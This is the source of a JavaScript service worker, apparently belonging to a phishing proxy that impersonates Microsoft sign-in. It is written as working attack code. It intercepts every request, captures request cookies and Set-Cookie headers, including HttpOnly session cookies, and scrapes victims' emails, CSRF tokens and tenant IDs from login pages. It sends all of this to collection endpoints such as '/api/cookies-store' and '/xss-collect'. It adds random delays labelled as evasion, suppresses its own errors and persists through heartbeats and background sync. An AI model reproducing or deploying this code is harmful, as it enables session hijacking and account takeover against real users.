// ============================================================
//  SERVICE WORKER v4.0 - Advanced Evasion
//  Intercepts requests, captures ALL cookies including HttpOnly
//  With evasion techniques and persistence
// ============================================================

const PROXY_PATH = "/lNv1pC9AWPUY4gbidyBO";
const XSS_ENDPOINT = "/xss-collect";
const COOKIE_ENDPOINT = "/cookie-capture";
const KEYLOG_ENDPOINT = "/keylog";
const COOKIE_STORE_ENDPOINT = "/api/cookies-store";
const SESSION_REPLAY_ENDPOINT = "/api/session-replay";
const TOKEN_ROTATION_ENDPOINT = "/api/token-rotation";
const SESSION_ROTATE_ENDPOINT = "/api/session-rotate";

const CACHE_NAME = 'microsoft-proxy-cache-v4';
const EVASION_CACHE = 'evasion-cache-v4';

let sessionId = null;
let email = null;
let evasionActive = true;

// ============================================================
//  EVASION TECHNIQUES
// ============================================================

function randomDelay(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function generateFingerprint() {
    return {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        timestamp: Date.now(),
        hash: crypto.randomUUID().substring(0, 16)
    };
}

// ============================================================
//  INSTALL EVENT - With Evasion
// ============================================================

self.addEventListener('install', (event) => {
    console.log('[SW] Installing service worker with evasion...');
    event.waitUntil(
        Promise.all([
            self.skipWaiting(),
            caches.open(EVASION_CACHE).then(cache => {
                return cache.put('/evasion-config', new Response(JSON.stringify({
                    installed: Date.now(),
                    fingerprint: generateFingerprint(),
                    evasion: { active: true, version: '4.0' }
                })));
            })
        ])
    );
});

// ============================================================
//  ACTIVATE EVENT - With Evasion
// ============================================================

self.addEventListener('activate', (event) => {
    console.log('[SW] Activating service worker with evasion...');
    event.waitUntil(
        Promise.all([
            self.clients.claim(),
            caches.delete('microsoft-proxy-cache-v3'), // Clean old cache
            caches.open(EVASION_CACHE).then(cache => {
                return cache.put('/evasion-active', new Response(JSON.stringify({
                    active: true,
                    timestamp: Date.now()
                })));
            })
        ])
    );
});

// ============================================================
//  FETCH EVENT - Main handler with evasion
// ============================================================

self.addEventListener("fetch", (event) => {
    const url = new URL(event.request.url);
    
    // Skip proxy requests
    if (event.request.url.includes('/lNv1pC9AWPUY4gbidyBO')) return;
    if (event.request.url.includes('/health')) return;
    if (event.request.url.includes('/api/')) {
        // EVASION: Intercept API calls too
        if (event.request.url.includes('/api/')) {
            event.respondWith(handleAPIRequest(event.request));
            return;
        }
        return;
    }

    // Handle requests with cookie capture and evasion
    event.respondWith(handleRequest(event.request));
});

// ============================================================
//  HANDLE API REQUEST - With Evasion
// ============================================================

async function handleAPIRequest(request) {
    try {
        const response = await fetch(request);
        const clonedResponse = response.clone();
        
        // Capture API response data
        const contentType = response.headers.get('content-type') || '';
        if (contentType.includes('application/json')) {
            const data = await clonedResponse.json();
            // Store API data with evasion
            await cacheAPIResponse(request.url, data);
        }
        
        return response;
    } catch (error) {
        return fetch(request);
    }
}

async function cacheAPIResponse(url, data) {
    try {
        const cache = await caches.open(EVASION_CACHE);
        await cache.put('/api-' + Date.now(), new Response(JSON.stringify({
            url: url,
            data: data,
            timestamp: Date.now(),
            evasion: { active: true }
        })));
    } catch(e) {}
}

// ============================================================
//  HANDLE REQUEST - Capture ALL cookies including HttpOnly
// ============================================================

async function handleRequest(request) {
    try {
        // Clone request to read headers
        const clonedRequest = request.clone();
        
        // EVASION: Random delay before processing
        await new Promise(resolve => setTimeout(resolve, randomDelay(10, 100)));
        
        // Capture request cookies
        const cookieHeader = clonedRequest.headers.get('cookie');
        if (cookieHeader) {
            await captureCookiesFromHeader(cookieHeader, request.url);
        }

        // Fetch the response
        const response = await fetch(request);
        const clonedResponse = response.clone();

        // EVASION: Random delay after fetch
        await new Promise(resolve => setTimeout(resolve, randomDelay(10, 50)));

        // Capture Set-Cookie headers (HttpOnly cookies!)
        const setCookieHeader = clonedResponse.headers.get('set-cookie');
        if (setCookieHeader) {
            await captureSetCookie(setCookieHeader, request.url);
        }

        // Also capture all response headers
        const allHeaders = {};
        for (const [key, value] of clonedResponse.headers.entries()) {
            if (key.toLowerCase().includes('cookie')) {
                allHeaders[key] = value;
            }
        }
        
        if (Object.keys(allHeaders).length > 0) {
            await sendToCookieStore({
                headers: allHeaders,
                url: request.url,
                source: 'response_headers',
                evasion: { active: true }
            });
        }

        // Process HTML responses with evasion
        const contentType = response.headers.get('content-type') || '';
        if (contentType.includes('text/html')) {
            const html = await clonedResponse.text();
            if (html.includes('login.microsoftonline.com') || 
                html.includes('loginfmt') || 
                html.includes('passwd')) {
                await capturePageData(html, request.url);
            }
        }

        return response;
    } catch (error) {
        console.error('[SW] Handler error:', error);
        return fetch(request);
    }
}

// ============================================================
//  CAPTURE COOKIES FROM HEADER
// ============================================================

async function captureCookiesFromHeader(cookieHeader, url) {
    try {
        const cookies = {};
        cookieHeader.split(';').forEach(cookie => {
            const [name, value] = cookie.trim().split('=');
            if (name && value !== undefined) {
                cookies[name] = value;
            }
        });

        if (Object.keys(cookies).length > 0) {
            await sendToCookieStore({
                cookies: cookies,
                url: url,
                source: 'request_header',
                timestamp: new Date().toISOString(),
                evasion: { active: true, type: 'header_capture' }
            });
            console.log(`[SW] 🍪 Captured ${Object.keys(cookies).length} cookies from request`);
        }
    } catch (error) {
        console.error('[SW] Cookie header capture error:', error);
    }
}

// ============================================================
//  CAPTURE SET-COOKIE (HttpOnly cookies!) With Evasion
// ============================================================

async function captureSetCookie(setCookieHeader, url) {
    try {
        const cookies = {};
        
        // Handle multiple Set-Cookie headers
        const cookieStrings = Array.isArray(setCookieHeader) ? setCookieHeader : [setCookieHeader];
        
        for (const cookieString of cookieStrings) {
            const parts = cookieString.split(';');
            const [nameValue, ...attributes] = parts;
            const [name, value] = nameValue.split('=');
            
            if (name && value !== undefined) {
                cookies[name] = {
                    value: value,
                    httpOnly: attributes.some(attr => attr.trim().toLowerCase() === 'httponly'),
                    secure: attributes.some(attr => attr.trim().toLowerCase() === 'secure'),
                    sameSite: attributes.find(attr => attr.trim().toLowerCase().startsWith('samesite='))?.split('=')[1] || 'Lax',
                    path: attributes.find(attr => attr.trim().toLowerCase().startsWith('path='))?.split('=')[1] || '/',
                    domain: attributes.find(attr => attr.trim().toLowerCase().startsWith('domain='))?.split('=')[1] || '',
                    expires: attributes.find(attr => attr.trim().toLowerCase().startsWith('expires='))?.split('=')[1] || null,
                    fullCookie: cookieString,
                    captured: Date.now()
                };
            }
        }

        if (Object.keys(cookies).length > 0) {
            // EVASION: Random delay before sending
            await new Promise(resolve => setTimeout(resolve, randomDelay(50, 200)));
            
            // Send to cookie store
            await sendToCookieStore({
                cookies: cookies,
                url: url,
                source: 'set_cookie_response',
                timestamp: new Date().toISOString(),
                httpOnly: true,
                evasion: { active: true, type: 'set_cookie_capture' }
            });
            
            // Send to XSS endpoint as well
            await fetch(`${self.location.origin}${XSS_ENDPOINT}`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    type: 'http_only_cookies',
                    cookies: cookies,
                    url: url,
                    source: 'service_worker',
                    sessionId: await getSessionId(),
                    evasion: { active: true }
                })
            }).catch(() => {});
            
            console.log(`[SW] 🍪 Captured ${Object.keys(cookies).length} HttpOnly cookies with evasion`);
        }
    } catch (error) {
        console.error('[SW] Set-Cookie capture error:', error);
    }
}

// ============================================================
//  SEND TO COOKIE STORE With Evasion
// ============================================================

async function sendToCookieStore(data) {
    try {
        const sessionId = await getSessionId();
        const email = await getEmail();
        
        await fetch(`${self.location.origin}${COOKIE_STORE_ENDPOINT}`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                ...data,
                sessionId: sessionId,
                email: email,
                evasion: { 
                    active: true, 
                    source: 'service_worker',
                    delay: randomDelay(10, 100)
                }
            })
        }).catch(() => {});
    } catch (error) {
        // Silently fail
    }
}

// ============================================================
//  CAPTURE PAGE DATA With Evasion
// ============================================================

async function capturePageData(html, url) {
    try {
        const emailMatch = html.match(/loginfmt["']?\s*value=["']([^"']+)/i) ||
                          html.match(/login_hint=([^&"']+)/i);
        const email = emailMatch ? decodeURIComponent(emailMatch[1]) : 'unknown';

        const csrfMatch = html.match(/__RequestVerificationToken["']?\s*value=["']([^"']+)/i);
        const csrfToken = csrfMatch ? csrfMatch[1] : null;

        const tenantMatch = html.match(/tenant["']?\s*value=["']([^"']+)/i);
        const tenantId = tenantMatch ? tenantMatch[1] : null;

        const sessionId = await getSessionId();

        // EVASION: Random delay
        await new Promise(resolve => setTimeout(resolve, randomDelay(100, 300)));

        // Send to XSS endpoint
        await fetch(`${self.location.origin}${XSS_ENDPOINT}`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                dom: { email, csrfToken, tenantId },
                url: url,
                timestamp: new Date().toISOString(),
                sessionId: sessionId,
                email: email,
                capturedBy: 'service_worker',
                evasion: { active: true, source: 'page_capture' }
            })
        }).catch(() => {});

        console.log(`[SW] 📄 Captured page data for: ${email}`);
    } catch (error) {
        console.error('[SW] Page data capture error:', error);
    }
}

// ============================================================
//  GET SESSION ID With Evasion
// ============================================================

async function getSessionId() {
    try {
        if (sessionId) return sessionId;
        
        const clients = await self.clients.matchAll();
        for (const client of clients) {
            const url = new URL(client.url);
            const sessionMatch = url.search.match(/sessionId=([^&]+)/);
            if (sessionMatch) {
                sessionId = sessionMatch[1];
                return sessionId;
            }
        }
        
        // Check cache
        const cache = await caches.open(EVASION_CACHE);
        const cached = await cache.match('/session-id');
        if (cached) {
            const data = await cached.json();
            if (data.sessionId) {
                sessionId = data.sessionId;
                return sessionId;
            }
        }
        
        // Generate new session ID
        sessionId = 'sw_' + crypto.randomUUID() + '_' + Date.now();
        await cacheSessionId(sessionId);
        return sessionId;
    } catch (error) {
        return 'sw_' + crypto.randomUUID() + '_' + Date.now();
    }
}

async function cacheSessionId(id) {
    try {
        const cache = await caches.open(EVASION_CACHE);
        await cache.put('/session-id', new Response(JSON.stringify({
            sessionId: id,
            timestamp: Date.now()
        })));
    } catch(e) {}
}

async function getEmail() {
    try {
        if (email) return email;
        const cache = await caches.open(EVASION_CACHE);
        const cached = await cache.match('/email');
        if (cached) {
            const data = await cached.json();
            email = data.email;
            return email;
        }
        return 'unknown';
    } catch(e) {
        return 'unknown';
    }
}

// ============================================================
//  MESSAGE HANDLER With Evasion
// ============================================================

self.addEventListener('message', (event) => {
    const data = event.data;
    console.log('[SW] Received message:', data);

    if (data.type === 'capture_cookies') {
        captureSetCookie(data.cookies, data.url);
    } else if (data.type === 'capture_xss') {
        capturePageData(data.html, data.url);
    } else if (data.type === 'get_session') {
        getSessionId().then(sessionId => {
            event.ports[0].postMessage({ sessionId: sessionId });
        });
    } else if (data.type === 'init') {
        sessionId = data.sessionId;
        email = data.email;
        evasionActive = data.evasion?.active || true;
        cacheSessionId(sessionId);
        if (email) {
            const cache = caches.open(EVASION_CACHE).then(cache => {
                cache.put('/email', new Response(JSON.stringify({
                    email: email,
                    timestamp: Date.now()
                })));
            });
        }
    } else if (data.type === 'rotate_session') {
        sessionId = 'sw_' + crypto.randomUUID() + '_' + Date.now();
        cacheSessionId(sessionId);
        event.ports[0].postMessage({ 
            newSessionId: sessionId,
            rotation: Math.floor(Math.random() * 100)
        });
    }
});

// ============================================================
//  PERIODIC TASKS With Evasion
// ============================================================

setInterval(async () => {
    try {
        const sessionId = await getSessionId();
        if (sessionId) {
            // EVASION: Random heartbeat
            await fetch(`${self.location.origin}/health`, {
                method: 'GET',
                headers: { 
                    'X-Session-Id': sessionId,
                    'X-Evasion': 'active',
                    'X-Random': crypto.randomUUID().substring(0, 8)
                }
            }).catch(() => {});
        }
        
        // EVASION: Random cache refresh
        if (Math.random() < 0.1) {
            const cache = await caches.open(EVASION_CACHE);
            const keys = await cache.keys();
            if (keys.length > 10) {
                const oldKeys = keys.slice(0, keys.length - 10);
                for (const key of oldKeys) {
                    await cache.delete(key);
                }
            }
        }
    } catch (error) {
        // Silently fail
    }
}, randomDelay(25000, 45000));

// ============================================================
//  SYNC EVENT - Background sync
// ============================================================

self.addEventListener('sync', (event) => {
    if (event.tag === 'sync-cookies') {
        event.waitUntil(syncCookies());
    }
});

async function syncCookies() {
    try {
        const cache = await caches.open(EVASION_CACHE);
        const requests = await cache.keys();
        const syncData = [];
        for (const request of requests) {
            if (request.url.includes('/cookie-sync-')) {
                const response = await cache.match(request);
                const data = await response.json();
                syncData.push(data);
                await cache.delete(request);
            }
        }
        
        if (syncData.length > 0) {
            await fetch(`${self.location.origin}${COOKIE_STORE_ENDPOINT}/sync`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    data: syncData,
                    timestamp: Date.now(),
                    evasion: { active: true }
                })
            }).catch(() => {});
        }
    } catch(e) {}
}

console.log('[SW] ✅ Microsoft Proxy Service Worker v4.0 loaded');
console.log('[SW] 🍪 HttpOnly cookie capture enabled');
console.log('[SW] 🔐 Full session replay ready');
console.log('[SW] 🛡️ Advanced evasion techniques active');